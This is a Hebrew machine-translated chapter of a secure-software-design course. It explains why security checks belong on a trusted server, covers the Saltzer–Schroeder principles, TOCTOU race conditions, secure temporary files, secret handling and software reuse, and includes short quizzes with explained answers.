#### תכנון המערכת לא מאובטח: אימות קלט JavaScript/WASM בצד הלקוח

עיצוב לא מאובטח קשור ונפוץ הוא המקום שבו קוד נשלח לדפדפני אינטרנט, לדוגמה, כ- JavaScript או WebAssembly (WASM), וקוד זה מבצע בדיקות אבטחה לפני שליחת הנתונים שלו לשרת. ברוב המצבים, תוקף יכול לשלוט בדפדפן האינטרנט, בזמן שהשרת נמצא בשליטתך, כך ששוב, אינך יכול לסמוך על שום דבר שדפדפן האינטרנט עושה. במילים אחרות, כל בדיקות אבטחה בקוד שנשלח לדפדפן יכולות לעקוף באופן טריוויאלי על ידי תוקף, שכן התוקפים שולטים בדפדפני האינטרנט שלהם. בעיה קשורה היא מתן גישה ישירה למסד נתונים למשתמשים לא מהימנים. לעתים קרובות משתמשים אינם זקוקים לגישה מלאה, ולכן זה נותן למשתמשים הרבה יותר הרשאות ממה שהם צריכים (תוך הפרת הפריבילגיה הפחותה), וגישה כזו יכולה להקשות על מניעת עקיפת בדיקות אבטחה. האיור הבא מציג טעות זו:

![עיצוב לא מאובטח: באיור זה בדיקות אימות קלט רלוונטיות לאבטחה מופעלות בדפדפן אינטרנט, ולא מופעלות שוב על-ידי שרת האינטרנט. מכיוון שהתוקף יכול לשלוט בדפדפן האינטרנט שלו, הדבר אינו מאובטח. מסד הנתונים נגיש ישירות גם למשתמשים מחוברים; זה סימן רע, כי זה נותן הרבה גישה לנתונים כי הוא לעתים קרובות מיותר.](insecure_design.png)

יישום JavaScript לא מאובטח

#### תכנון המערכת מאובטח: אימות קלט בסביבה שניתן לסמוך עליה

אתה יכול להשתמש JavaScript בצורה מאובטחת, אתה רק צריך לעשות את זה נכון. אתה יכול לשלוח JavaScript ללקוח, ואתה יכול לעשות כמה בדיקות רלוונטיות לאבטחה בדפדפן (למשל, כדי לתת משוב מהיר). אבל אם התוקפים יכולים לשלוט בדפדפני אינטרנט מסוימים (אך לא בשרתים), בדיקות האבטחה בצד הדפדפן אינן רלוונטיות לאבטחה. במקרה נפוץ זה, עליך לבצע את כל בדיקות הקלט הקשורות לאבטחה בשרתים, גם אם חלק מהבדיקות היו אמורות להיעשות בלקוח וכעת הן "מבוצעות מחדש". בדיקות הקלט (אימותים) אינן באמת מבוצעות מחדש, מכיוון שלא ניתן היה לסמוך על אלה בצד הלקוח.

האיור הבא מציג עיצוב דומה אך מאובטח; שים לב שכל הבדיקות הקשורות לאבטחה נעשות בשרת, שכן במקרה זה זו המערכת שאנו יכולים לסמוך עליה. היא גם מונעת גישה ישירה למסד נתונים, וזה לעתים קרובות רעיון טוב אם משתמשים אינם זקוקים לגישה ישירה:

![חלופה מאובטחת יותר של יישום JavaScript: באיור זה כמה בדיקות אימות קלט רלוונטיות לאבטחה מופעלות בדפדפן אינטרנט, אך כל בדיקות האבטחה מופעלות על-ידי שרת האינטרנט, גם אם חלקן הופעלו בדפדפן קודם לכן. מכיוון שהשרת במקרה זה מהימן, זהו עיצוב מאובטח. מסד הנתונים אינו נגיש ישירות למשתמשים מחוברים; זוהי ארכיטקטורה טובה, כי גישה ישירה למסד הנתונים היא לעתים קרובות מיותרת.](a_secure_design.png)

חלופה מאובטחת יותר של יישום JavaScript


#### תכנון המערכת לא מאובטח: יישום נייד עם בדיקה בצד הלקוח

עיצוב לא מאובטח נפוץ דומה הוא קוד באפליקציות סלולריות לסמארטפון שעושה את כל בדיקות האבטחה לפני שליחת הנתונים שלו לשרת. שוב, איננו יכולים להניח כי בדיקות אבטחה כלשהן ביישום הנייד אכן יבוצעו. תוקף יכול לשנות את היישום הנייד, או לכתוב יישום אחר, כדי לעקוף את כל הבדיקות שבוצעו ביישום הנייד. אם אתה כותב יישום נייד לסמארטפון, אתה גם בדרך כלל לא יכול לסמוך על היישומים האחרים - היישומים האחרים עשויים בעצמם להיות זדוניים!

#### תכנון המערכת לא מאובטח: יישום לקוח בהתאם לשרת לא מהימן

אל תתבלבלו; ההודעה אינה *"שרת טוב, לקוח רע".* הבעיה היא שכמעט בכל המקרים, כל קוד שאתה צריך לסמוך עליו חייב לפעול בסביבה שאתה יכול לסמוך עליה.

אם אתה כותב דפדפן אינטרנט, לדוגמה, תצטרך לסמוך על שירותי מערכת ההפעלה המקומיים, אך אתה בהחלט לא יכול לסמוך על שרתי אינטרנט מרוחקים שרירותיים - חלק מאותם שרתי אינטרנט מרוחקים עלולים לשלוח לך נתונים זדוניים!

#### המפתח: הפעל קוד שעליך לתת בו אמון בסביבה שניתן לסמוך עליה

בקיצור: כל קוד שאתה צריך לסמוך עליו חייב (ברוב המקרים) לפעול בסביבה שאתה יכול לסמוך עליה, *לא* במערכת שעשויה להיות נשלטת על ידי תוקף.

באפשרותך להשתמש ב- JavaScript בצד הלקוח, ב- WebAssembly בצד הלקוח וביישומים ניידים - זו לא הבעיה. אתה יכול לכתוב גם דפדפני אינטרנט! הבעיה היא מתן אמון במערכת שעשויה להיות תחת שליטתו של תוקף. אם יש לך מערכת שרת-לקוח מבוססת אינטרנט, לדוגמה, בדרך כלל הקוד הפועל בשרת (שאתה שולט בו) חייב לבצע את כל בדיקות האבטחה. אחרי הכל, תוקפים יכולים לבנות או לשנות לקוחות אינטרנט משלהם, כולל כל JavaScript שנשלח ללקוח שלהם על ידי שרת. זה בסדר להריץ בדיקות על מערכת שאתה לא סומך עליה באופן מלא אם אתה רוצה לספק תגובה מהירה לטעויות לא מכוונות. אבל זה לא מספיק - עבור אבטחה, כל בדיקות האבטחה צריך להיעשות (או מחדש) על מערכת שאתה יכול לסמוך באופן מלא. באפשרותך להפעיל בדיקות אלה בצד השרת באמצעות JavaScript, WebAssembly או כל דבר אחר שאתה בוטח בו - אך עליך להפעיל את הבדיקות במערכת שניתן לסמוך עליה.

מפתחים מסוימים מנסים להריץ קוד במערכות שהם לא יכולים לסמוך עליהן באמצעות ערפול. כלומר, הם ישתמשו בכלים שמנסים להקשות על הבנת הקוד שנשלח למערכת שהם לא יכולים לסמוך עליה. דוגמה לכך היא שימוש במיניפיקציה של JavaScript ובתקווה שזה יקשה על הבנת קוד הלקוח. אל תעשה את זה! המטרה של מיניפיקציה של JavaScript היא להפחית את מספר הבתים שנשלחים ברשת, לא להסתיר את מה שהקוד עושה או למנוע את שינויו.

מה שניתן לטשטש ניתן לטשטש, וקל להפליא לתוקפים לטשטש מידע. קיימים כלים רבים שיכולים לטשטש מידע במהירות. עדיף להימנע מניסיון להריץ קוד שאתה צריך לסמוך עליו במערכות שאינך יכול לסמוך עליהן.

זה הרבה יותר טוב להפעיל תוכנה שאתה צריך לסמוך על מערכת שאתה יכול לסמוך עליה; אז התוכנה פשוט עובדת כל הזמן.

#### סימני אזהרה

בניית מערכת עם בדיקות ביטחוניות שניתן לעקוף היא טעות מסוכנת. לא רק שזה אומר שהמערכת אינה מאובטחת, אלא שלעתים קרובות קשה מאוד לתקן את הטעות הזו ברגע שאתה עושה אותה. ייתכן שיהיה עליך לשכתב תוכנות רבות כדי לתקן טעות זו. הנה רשימה מהירה של דברים שיש לחפש שעשויים להצביע על טעויות מסוג זה:

* HTML או תבנית נתונים אחרת הנשלחת ללקוח המבצע אימות קלט רלוונטי לאבטחה במערכת שתוקף עשוי לשלוט בה. זה יכול להיות בסדר, אבל רק אם כל הבדיקות האלה מבוצעות מחדש בסביבה מהימנה.

* JavaScript או קוד אחר שנשלח ללקוח שמבצע אימות קלט או פעולות רלוונטיות אחרות לאבטחה במערכת שהתוקף עשוי לשלוט בה. זה יכול להיות בסדר, אבל רק אם כל הבדיקות האלה מבוצעות מחדש בסביבה מהימנה.

* אפליקציה למכשירים ניידים שמבצעת אימות קלט רלוונטי לאבטחה. זוהי אותה בעיה בצד הלקוח.

* מסד נתונים הנגיש ישירות דרך הרשת לשימוש על ידי יישום לקוח (דפדפן אינטרנט, אפליקציה לנייד וכו '). פעולה זו יכולה להיות מאובטחת, אך עליך לוודא שכל הפעולות שהמשתמש רשאי לבצע מאושרות. במערכות רבות, אתה יכול לשלוט על זה עם הפקודה SQL GRANT, אם אתה צריך לעשות את זה. עם זאת, לעתים קרובות עדיף (או הכרחי) לתווך גישה באמצעות תוכנית במקום לספק גישה ישירה למסד נתונים. גישה ישירה למסד נתונים עלולה להקשות על ביצוע אימות קלט. לעתים קרובות זה מפר את הפריבילגיה לפחות, שכן לעתים קרובות המשתמש אינו זקוק לגישה מלאה למסד הנתונים. אם אתה מספק גישה ישירה למסד נתונים, שקול להגביל את ההרשאות. לדוגמה, ייתכן שתעניק גישה רק לתצוגה לקריאה בלבד במקום למסד הנתונים כולו.

* ערוץ תקשורת רשת שתוקף יכול לחטוף. חיבורי רשת המיושמים כראוי המשתמשים ב- TLS (כגון **https:**) ו- SSH מתנגדים לחטיפה; כמעט כל השאר לא. תוכנה עשויה לתקשר דרך הערוץ בהנחה שהיא מדברת עם אותו משתמש/תוכנה, אך ניתן לעקוף זאת בקלות אם ניתן לחטוף את הערוץ.

#### ניסיון להפעיל תוכנה שאתה חייב לסמוך עליה בסביבות לא אמינות

*האם* אתה יכול לנסות להפעיל תוכנה שאתה צריך לסמוך עליה במערכת שאתה לא סומך עליה? אתה יכול לנסות, אבל זה בדרך כלל מסתדר רע, וניסיון לעשות את זה הוא נושא מתקדם מאוד. הנה כמה מהטכניקות שנוסו:

* טכניקה אחת היא הצפנה הומומורפית. זה מאפשר לך להפעיל קוד בזמן שהנתונים נשארים מוצפנים. אבל כיום הצפנה הומומורפית היא מעשית רק בנסיבות מיוחדות. זה סדרי גודל איטיים ומורכבים הרבה יותר.

* מנגנוני ה-Software Guard eXtensions (SGX) של אינטל אמורים לאפשר ביצוע ואחסון נתונים, אך בפועל הם נשברו שוב ושוב ([*ביזה של מפתחות קריפטו מ-SGX מאובטח במיוחד שולחת את אינטל לטרוף שוב, *](https://arstechnica.com/information-technology/2020/06/new-exploits-plunder-crypto-keys-and-more-from-intels-ultrasecure-sgx/)מאת דן גודין, 2020).

* אם אתה מנסה לאבטח משחקים במחשב נייד / שולחני, ואתה לא סומך על המחשב הנייד / שולחן העבודה, יש מערכות נגד לרמות. אבל מערכות נגד רמאות נשברות באופן שגרתי. עדיף לך לקיים אירועים פיזיים שבהם כל המחשבים הניידים / המחשבים השולחניים נמצאים בבעלותך.

באופן כללי, עדיף לך עם פתרונות פשוטים שאינם כרוכים בניסיון לסמוך על מערכות הנשלטות על ידי תוקפים.

#### חידון 2.4: גישור מלא (אי עקיפה)

\>\>שרת שולח JavaScript מבוסס React לדפדפן אינטרנט. מפתח רוצה לכלול כמה בדיקות אבטחה של הקלט בקוד React בצד הלקוח (בצד הדפדפן), ואומר שהשרת יכול לתת אמון בבדיקות אבטחה אלה מכיוון שהשרת שלח את קוד React בצד הלקוח מלכתחילה. איזה מהמשפטים הבאים נכון?<<

( ) השרת *יכול* לתת אמון בבדיקות האבטחה בצד הלקוח במקרה זה.

(x) לשרת *אין אפשרות* לתת אמון בבדיקות האבטחה בצד הלקוח במקרה זה

[הסבר]

לשרת אין אפשרות לבדוק בדיקות אבטחה בצד הלקוח באופן כללי, כולל במקרה זה. השרת עשוי לשלוח JavaScript מבוסס React לדפדפן אינטרנט, אך התוקף ** שולט בדפדפן האינטרנט. משמעות הדבר היא שהתוקף יכול לשנות את הקוד המופעל לאחר קבלתו, או פשוט לשנות את התשובות שהקוד ישלח בחזרה לשרת. שים לב שזה לא ספציפי ל- React, זה יהיה נכון עבור *כל* קוד בצד הלקוח... אנחנו פשוט משתמשים ב-React כדוגמה נפוצה.  מערכת בדרך כלל אינה יכולה לתת אמון במערכת אחרת הנמצאת תחת שליטה פוטנציאלית של תוקף.

[הסבר]

### שאר עקרונות תכנון המערכת של זלצר ושרודר

הבה נבחן בקצרה את שאר עקרונות העיצוב המאובטח שזוהו על ידי זלצר ושרודר (מעבר לפריבילגיה הפחותה ולגישור המלא):

1. **כלכלה של מנגנון (aka פשטות)**. המערכת, בפרט החלק שהאבטחה תלויה בו, צריכה להיות פשוטה וקטנה ככל האפשר. זה הופך את החלק הזה של המערכת לקל יותר לבדיקה וקשה יותר לטעות. כמובן, תוכנה מודרנית מתבקשת לעתים קרובות לספק הרבה פונקציונליות, אז אתה בדרך כלל לא יכול לעשות הכל פשוט מאוד, אבל אתה יכול לפחות לעבוד כדי להפוך את החלק כי האבטחה תלויה פשוט ככל האפשר.

2. **עיצוב פתוח**. אסור שמנגנון ההגנה יהיה תלוי בבורות של התוקפים. במקום זאת, המנגנון צריך להיות ציבורי, בהתאם לסודיות של פריטים מעטים יחסית (וניתנים לשינוי בקלות) כמו סיסמאות או מפתחות פרטיים. עיצוב פתוח מאפשר ביקורת ציבורית נרחבת. עיצוב פתוח גם מאפשר למשתמשים לשכנע את עצמם שהמערכת שעומדת לשימוש מספקת. למען האמת, זה לא מציאותי לנסות לשמור על סודיות עבור מערכת כי הוא מופץ באופן נרחב; מפרקים וחומרה חתרנית יכולים לחשוף במהירות כל "סודות" ביישום. אחד היתרונות הגדולים של תוכנת קוד פתוח (OSS) הוא שהיא מיישמת טוב יותר את עקרון העיצוב הפתוח; לקוד המקור של OSS יש עיצוב פתוח, המאפשר לכל אחד אחר לסקור אותו ולבצע שינויים כדי לשפר אותו. כמובן, OSS צריך *למעשה* להיבדק עבור זה כדי לעזור, אבל זה  יתרון *פוטנציאלי* חשוב  .

3. **ברירות מחדל בטוחות לכשל (הידועות גם כברירות מחדל מאובטחות כשל)**. התקנת ברירת המחדל צריכה להיות ההתקנה המאובטחת. אם לא בטוח שצריך לאפשר משהו, אל תאפשר את זה. לדוגמה, אל תפיץ תוכנה עם סיסמה ריקה או סיסמת ברירת מחדל; במקום זאת, *דרוש* להגדיר סיסמה חדשה בעת התקנת התוכנה. בדרך זו, אם מישהו רק מתקין אותו במהירות, לא תהיה לו פגיעות עקב סיסמה ידועה. ודא שהרשאות ברירת המחדל מאובטחות; קטגוריית חולשה [CWE-276](https://cwe.mitre.org/data/definitions/276.html) היא "הרשאות ברירת מחדל שגויות".

4. **הפרדת הרשאות (למשל, שימוש באימות דו-גורמי)**. הגישה לאובייקטים צריכה להיות תלויה ביותר מתנאי אחד, כך ששבירת תנאי אחד לא תשבור הכל. בקיצור, ודאו שאם התוכנה שלכם כוללת מנגנון התחברות, יש לה דרך לתמוך באימות דו-שלבי (2FA).

5. **המנגנון הכי פחות נפוץ (כלומר למזער שיתוף).** צמצם את הכמות והשימוש במנגנונים משותפים אם למשתפים יש הרשאות שונות. הימנע משיתוף קבצים, ספריות, ביצוע ליבה של מערכת הפעלה או מחשבים עם משהו שאינך בוטח בו, מכיוון שהתוקפים עלולים לנצל אותם. כמובן, במקרים רבים זה נסחר בגלל גורמים אחרים. דוגמה ברורה היא שירותי ענן: במקרים מסוימים, שימוש בשירות ענן עלול לגרום לתוכנית שלך לפעול בסביבה משותפת עם יריב. במקרה של שירותי ענן, לעתים קרובות ישנם גורמים מקלים שהופכים אותם למקובלים (לדוגמה, ספק שירותי הענן עשוי לספק שורה של אמצעים כדי לספק בידוד טוב יותר, ו/או עשוי להיות צוות מנוסה יותר שמגן ומנטר את המערכות מאשר אתה יכול). עם זאת, זה עדיין נכון שכל דבר שאתה משתף עם תוקף עלול להוסיף דרך נוספת שבה הוא יותקף. אם שיתוף כזה מסוכן מדי עבור היישום שלך, תוכל לבחור חלופות עם פחות שיתוף (כגון ענן של דייר יחיד או ענן פרטי). במקרים מסוימים שיתוף יכול להפחית עלויות אך להגביר את סיכוני האבטחה. ההחלטה הטובה ביותר תלויה בנסיבות, וכל מה שעקרונות העיצוב יכולים לעשות הוא לעזור לך לזהות את הפשרה.

6. **קבלה פסיכולוגית (aka קל לשימוש)**. הממשק האנושי חייב להיות מתוכנן כך שיהיה קל שימוש כך שהמשתמשים ישתמשו באופן שגרתי ואוטומטי במנגנוני ההגנה בצורה נכונה. טעויות יצטמצמו אם מנגנוני האבטחה יתאימו באופן הדוק לדימוי המנטלי של המשתמש לגבי מטרות ההגנה שלו. יש אנשים שחושבים שתמיד יש סחר בין אבטחה לקלות שימוש, אבל זה לעתים קרובות לא נכון; אם משהו קשה לשימוש, הוא לעתים קרובות חסר ביטחון בפועל (כי אנשים יעבדו סביב זה). קלות שימוש גרועה מטעמי אבטחה מראה בדרך כלל שהתוכנה לא תוכננה להיות מאובטחת מלכתחילה; אני מקווה שהקורס הזה יעזור לך להימנע מכך!

## חידון 2.5

\>\>איזה מהבאים הוא עיקרון אבטחה מקובל?|| בדוק את כל האפשרויות שלהלן שהן עקרונות אבטחה מקובלים, ואל תבדוק אותן אחרת.<<

[!] הפוך את קוד המקור לקשה להבנה (למשל, השתמש בשמות מעורפלים) כך שיהיה קשה יותר לזהות פגיעויות. {{ נבחר: לא, אם קוד המקור קשה יותר להבנה, אז יהיה קשה יותר למפתחים להפוך אותו למאובטח מלכתחילה. אתה צריך לשאוף לשמור על המערכת פשוטה ככל האפשר. }}

[ ] ודא כי העיצוב של מנגנון האבטחה הוא סודי, כך שיהיה קשה יותר לגלות בעיות בו. {{ נבחר: לא, עיקרון מובן מזמן הוא "תכנון פתוח" - המערכת חייבת להיות מאובטחת גם אם העיצוב של מנגנון האבטחה הוא ציבורי. במוקדם או במאוחר העיצוב שלה יתגלה, ואתה לא יכול לדעת מתי זה קרה. עדיף להבטיח שזה יהיה מאובטח גם אם איך זה עובד ידוע. }}

[x] התוכנה צריכה להיות מאובטחת כברירת מחדל.

[x] תומך באימות דו-שלבי (2FA), כך שגם אם לתוקף יש ערך אימות יחיד (כגון סיסמה), התוקף לא יוכל לנצל אותו.

[x] צמצם את שיתוף הרכיבים בין בעלי הרשאות שונות. דוגמאות לרכיבים הן ספריות וגורמים מכילים פועלים.

[x] הפוך את התוכנה לקלה לשימוש, בפרט, נסה להבטיח שהמשתמשים ישתמשו באופן שגרתי ואוטומטי במנגנוני ההגנה כראוי.

### עקרונות תכנון המערכת אחרים

עקרונות עיצוב רבים אחרים הוצעו, בהתבסס על בעיות שקרו למערכות קודמות. לאחר מכן, נסתכל על כמה עקרונות עיצוב אחרים שאתה צריך לשקול.

#### היזהרו מתנאי גזע

 *מצב גזע* מתרחש כאשר ההתנהגות הנכונה של מערכת תלויה ברצף האירועים, אך אין שליטה על רצף זה. תנאי גזע כוללים בדרך כלל תהליך אחד או יותר או שרשורים בגישה למשאב משותף, אך גישה מרובה זו לא נשלטה כראוי.

<img src="openai/racecars.png" width="512" height="512" alt="A blue racecar and a red racecar racing to the finish line in front of a futuristic city"><br>
*מכוניות מרוץ* שנוצרו על ידי [Dall-E-2 של OpenAI](https://openai.com/dall-e-2/)

אם אין שליטה בכלל, זה פגם, וזה יכול להיות אפילו פגיעות. תוכניות רבות, כדי להיות מאובטחות, צריכות לעשות שני דברים: (1) לקבוע אם בקשה מורשית, ו-(2) אם כן, לפעול על פי בקשה זו. אם התוקף יכול לשנות את המצב בין שלבים 1 ל -2, התוכנית יכולה לקבוע נכונה שהיא מורשית, אך לאחר מכן לאפשר פעולה אחרת שלא אושרה ** . סוג זה של טעות אבטחה הוא כל כך נפוץ כי יש לו שם, *זמן של בדיקה - זמן השימוש* (TOCTOU) מצב גזע.

במצבים רבים, הדרך הנכונה להתמודד עם תנאי המירוץ של TOCTOU היא ליישם ולהשתמש בממשקי API שגם בודקים את ההרשאה וגם מבצעים את הפעולה *בו זמנית* (כלומר, הם לא יאפשרו לתוקף לשנות את המצב בין הבדיקה לבין השימוש). לדוגמה:

1. בעת יצירת קבצים או כל דבר אחר בעל הרשאות המשויכות אליו, אל תיצור אותם ולאחר מכן נסה לצמצם את ההרשאות שלהם. במקום זאת, צור אותם עם הרשאות מינימליות מאוד והרחיב אותם לפי הצורך. בדרך זו, אין חלון זמן שבו תוקף עשוי להיות מסוגל לנצל את ההרשאות העודפות.

2. אם אתה כותב תוכנית עבור מערכת דמוית יוניקס, אל תתקשר  לגישה() כדי ** לראות אם ניתן לפתוח קובץ, ולאחר מכן קריאה **לפתיחה()**** כדי לפתוח את הקובץ בפועל. במקום זאת, הגדר את הדברים כך שפשוט יתקשרו **לפתיחה() ** ישירות, מכיוון ש**- open()** כולל בדיקה כדי לראות אם הגישה מותרת.

3. אם ברצונך להבטיח שתיצור קובץ חדש במערכת דמוית יוניקס, הקפד לבקש שהוא ייווצר *באופן בלעדי (*O_EXCL** ב- API הפתוח** של C ** , והאות **x** ב**-  **fopen()** ודגלי האפשרויות המשמשים בשפות תכנות רבות אחרות). שוב, בדרך זו אין חלון הזדמנויות לתוקף ליצור את הקובץ לפני שהתוכנית יכולה (אם התוקף יכול לעשות זאת).

שגיאה נפוצה במקצת במערכות דמויות יוניקס היא יצירת קבצים זמניים בצורה לא מאובטחת. ניתן ליצור קבצים באופן זמני בספריה שבה תוקף יכול להשפיע על היצירה והשמות של קבצים אחרים. אם תוקף יוצר תחילה קובץ, ולאחר מכן היישום מבקש "ליצור" קובץ מבלי לבקש שהוא יהיה בלעדי, נעשה שימוש חוזר בקובץ הקיים הנשלט על-ידי התוקף. שימוש פשוט באפשרות הבלעדית אינו מספיק, שכן זה עדיין יאפשר מניעת שירות. הפתרון הוא להשתמש בלולאה פשוטה שיוצרת שם קובץ "אקראי" בספרייה המיועדת ולאחר מכן לנסות ליצור אך ורק עם הרשאות מוגבלות מקסימלית.

לרוב השפות יש שגרה או פקודה ליצור קבצים זמניים באופן מאובטח; השתמש בהם היכן שהם זמינים. ב- Python מודול tempfile יכול ליצור קבצים זמניים באופן מאובטח. סקריפטים של מעטפת יכולים להשתמש בפקודה mktemp כדי ליצור קבצים זמניים באופן מאובטח.


 תנאי מירוץ הם סיבה כה נפוצה לפגיעויות אבטחה שזה 2021 CWE Top 25 #33 ו- 2019 CWE Top 25 #29.  *ביצוע בו-זמני באמצעות משאב משותף עם סינכרון לא תקין ('מצב גזע')* הוא [CWE-362](https://cwe.mitre.org/data/definitions/362.html). * קובץ זמני לא מאובטח* הוא [CWE-377](https://cwe.mitre.org/data/definitions/377.html).

#### להקשיח את המערכת

פגמים קורים! אבל הם לא צריכים להפוך לפגיעויות. במקום זאת, נסה לתכנן את המערכת שלך כך שפגם בודד יהיה הרבה פחות סביר שיגרום לפשרה מוחלטת. זהו בעצם יישום ספציפי של עקרון הפריבילגיה הפחותה, אך אם אתה חושב באופן ספציפי על הפיכת המערכת לקשה לערעור *גם* כאשר יש בה פגם, אתה עשוי לזהות צעדים אחרים שאתה יכול לנקוט.

ישנם מנגנונים רבים שיכולים להקשיח מערכת. דוגמאות כוללות מדיניות אבטחת תוכן (CSP) ואקראיות פריסת שטח כתובות (ASLR). נדון בכמה מנגנוני הקשחה בהמשך הקורס. הנקודה כאן היא שאתה צריך להפעיל מנגנוני הקשחה או להבטיח שהמשתמשים שלך יוכלו להפעיל אותם.

#### שמור סודות בסוד

אם התוכנה שלך מנהלת סודות כמו מפתחות הצפנה פרטיים וסיסמאות, ודא שהם נשארים סודיים. בפרט:

* אל תכניס סודות חיים לקוד המקור שלך. קוד המקור מנוהל על ידי מערכות בקרת גרסאות ולעתים קרובות מתפשט ליותר אנשים ומערכות ממה שאתה חושב.

* אחסן סיסמאות המשמשות לאימות נכנס באמצעות אלגוריתם שתוכנן במיוחד לעשות זאת. נדון בהם בהמשך הקורס, אך אלגוריתמים מסוג זה נקראים  אלגוריתמי *גיבוב מלוחים לכל משתמש* (כגון argon2id, bcrypt או PBKDF2). אם הדבר נעשה כהלכה, אין זה אפשרי עבור תוקף לקבוע סיסמאות רבות גם אם התוקף מקבל את נתוני הסיסמה המוצפנים.

* השתמש https:// **** במקום **http://**; המספק קישור מוצפן כדי למנוע דליפת נתונים.

* הימנע מקבלת ושליחה של נתונים סודיים (כמו מפתחות פרטיים) כפרמטרים של שורת הפקודה, היכן שאתה יכול; פרמטרים של שורת הפקודה גלויים לעתים קרובות לתהליכים אחרים במערכת.


#### סמוך על ערוצים אמינים בלבד

באופן כללי, סמוך רק על מידע (קלט או תוצאות) מערוצים מהימנים. לדוגמה, השתמש https:// **** במקום **http://** בעת יצירת קשר עם שרת, מכיוון שמאפשר לבדוק אם לשרת יש אישור הצפנה חוקי עבור אתר זה. באופן כללי עליך להשתמש ב**- https**, מכיוון שזה ימנע מהתוקפים לחטט או לשנות מידע שהוחלפו עם משתמשים אחרים.

#### הפרדת נתונים מ'בקרה'

טריק שימושי לפיתוח תוכנה מאובטחת יותר הוא להפריד נתונים משליטה (aka תוכניות). במילים אחרות, עליך להפריד את הנתונים הפסיביים מהתוכניות המבוצעות. בדרך זו, אם תוקף מצליח להחליק מידע "נוסף" לנתונים, הדבר לא יגרום להפעלת תוכנית זדונית פוטנציאלית. זוהי בעצם דרך נוספת ליישם את הפריבילגיה הפחותה ביותר - אל תיתן לנתונים את הזכות לפעול כתוכנית.

דוגמה טובה לכך היא מדיניות אבטחת התוכן (CSP) הנתמכת על ידי דפדפני אינטרנט מודרניים. CSP מאפשר לך לציין שה- HTML שנשלח הוא נתונים בלבד, *ואינו* מורשה לספק סקריפטים מוטבעים (תוכניות) או סגנונות (שיכולים להיות גם תוכניות) - במקום זאת, ניתן להוריד את הסקריפטים והסגנונות רק ממקומות מהימנים שצוינו. באופן זה, אם תוקף מצליח לחתור תחת ה- HTML, התוקף לא יוכל לגרום להפעלת תוכניות המסופקות על-ידי התוקף.

 עיצוב לא מאובטח הוא טעות כל כך נפוצה ביישומי אינטרנט שזה 2021 OWASP Top 10 #4.

#### חידון 2.6: עקרונות תכנון המערכת אחרים

\>\>איזה מהבאים הוא עיקרון אבטחה נוסף שימושי?|| בדוק את כל האפשרויות שלהלן שהן עקרונות אבטחה מקובלים, ואל תבדוק אותן אחרת.<<

[!x]תכנון המערכת והטמע מערכות כדי להבטיח שלאחר אישור הבקשה, תוקף אינו יכול לשנות משהו רלוונטי להחלטה זו לפני שהבקשה מטופלת. {{ לא נבחר: זה חשוב, זה נקרא מצב מרוץ זמן בדיקה/זמן שימוש (TOCTOU). }}

[x] שנה את העיצוב והתצורה של המערכת כך שהסבירות לפשרה נמוכה יותר *גם* אם יש פגם. {{ לא נבחר: זה נכון, זה נקרא "הקשחת" מערכת. }}

[ ] הצב סיסמאות ומפתחות סודיים בקוד המקור, כך שהמערכת תוכל לקבל מידע זה ולהשתמש בו במהירות מבלי להיות תלויה ברכיבים חיצוניים או במאגרי נתונים. {{ נבחר: לא, בבקשה אל תעשה ** את זה. סיסמאות ומפתחות סודיים לא צריכים להיות בקוד מקור. אם הם לא מופיעים בקוד המקור, אנשים שיכולים לראות את קוד המקור לא יקבלו את המידע הסודי, והשארתם מחוץ לקוד המקור גם מקלה על שינוי הסיסמאות והמפתחות. }}

[ ] כלול שליטה (כולל תוכניות) עם נתונים, כך כיצד לתפעל את הנתונים מסופק בקלות עם הקוד. {{ נבחר: זה יכול להיות שימושי, אבל זה גם מסוכן מבחינה ביטחונית. אם תוקף מצליח להחדיר מידע "נוסף" לנתונים, עיצוב זה יכול להקל על הפעלת תוכנית שעלולה להיות זדונית. לפעמים חשוב לעשות זאת בכל מקרה, אבל זה יוצר סיבוכים נוספים בעת פיתוח תוכנה מאובטחת. }}

# שימוש חוזר בתוכנות חיצוניות

פרק זה מתאר כיצד לעשות שימוש חוזר בתוכנה מתוך מחשבה על אבטחה, כולל בחירה, הורדה, התקנה ועדכון של תוכנות כאלה.

מטרות הלמידה:

1. דיון בהשפעה שיש לתוכנות חיצוניות על אבטחה.

2. דיון כיצד יש להתחשב באבטחה בעת בחירת תוכנה.

3. דיון כיצד יש להתחשב באבטחה בעת הורדה והתקנה של תוכנה.

4. דיון בחשיבות עדכון התוכנה שנעשה בה שימוש חוזר.

5. דיון בחשיבות של הימנעות/החלפת שימוש בממשקים מיושנים.

## שרשרת אספקה

### יסודות השימוש החוזר בתוכנה

בעת פיתוח תוכנה, נעשה בדרך כלל שימוש חוזר בתוכנות אחרות. לדוגמא, מערכת הפעלה, סביבת ריצה כגון קונטיינר (container), תשתיות (frameworks), ספריות, הרחבות, יישומי Plug-in, ערכות נושא וכן הלאה. בדרך כלל נישתמש גם בכלי פיתוח שאחרים פיתחו. תוכנה שכזו שנעשה בה שימוש חוזר, והאופן שבו מקבלים אותה, יכולים להשפיע באופן משמעותי על אבטחת התוצר.

![תלות](../../dependency.png)

*תלות* (נלקח מתוך [xkcd.com](https://xkcd.com/2347/), מורשה תחת [CC-BY-NC-2.5](https://creativecommons.org/licenses/by-nc/2.5/))

יש הרואים בבחירת התוכנה שנעשה בה שימוש חוזר כחלק מתכנון המערכת, שכן היא משפיעה בבירור על האופן שבו נחלק את הבעיה. אחרים עשויים לתאר זאת כקטגוריה משלה, למשל, שרשרת אספקה. לא משנה איך תקראו לזה, זה חשוב. באופן כללי, מערכות תוכנה כיום הן בעיקר תוכנות בשימוש חוזר ממקום אחר.

אם רוכשים תוכנה יקרה מטעם ארגון, לעיתים קרובות ישנם שלבים ותהליכים רבים שיש לשקול, המתמקדים בעיקר בתקציב. שיקולים אלה הם מחוץ לתחום הקורס הזה. במקום זאת, אנחנו נתמקד בהיבטים הספציפיים הקשורים לאבטחה.

